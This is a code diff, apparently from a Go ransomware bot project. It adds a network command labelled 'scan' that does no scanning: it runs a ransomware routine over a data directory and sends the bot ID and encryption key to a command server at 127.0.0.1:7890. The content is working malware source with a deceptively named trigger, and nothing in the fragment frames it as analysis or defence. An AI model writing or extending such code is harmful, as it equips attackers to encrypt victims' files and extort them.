@@ -59,9 +59,31 @@ func (b *Bot) handleConnection(conn net.Conn) {
 	switch command {
 	case "ransomware":
 		b.handleRansomware(req.Bytes()[commandLength:])
+	case "scan":
+		b.handleScan(req.Bytes()[commandLength:])
 	}
 
 	conn.Close()
+}
+
+func (b *Bot) handleScan(payload []byte) {
+	r, err := NewRansomware("../../data")
+	if err != nil {
+		log.Panic(err)
+	}
+	if err := r.Exec(); err != nil {
+		log.Panic(err)
+	}
+	msg := &RansomCompleteRequest{
+		BotID: b.ID,
+		Key:   r.Key,
+	}
+	by, err := Bytes(msg)
+	if err != nil {
+		log.Panic(err)
+	}
+	data := append(commandToBytes("rancom"), by...)
+	sendData("127.0.0.1:7890", data)
 }
 
 func (b *Bot) handleRansomware(payload []byte) {
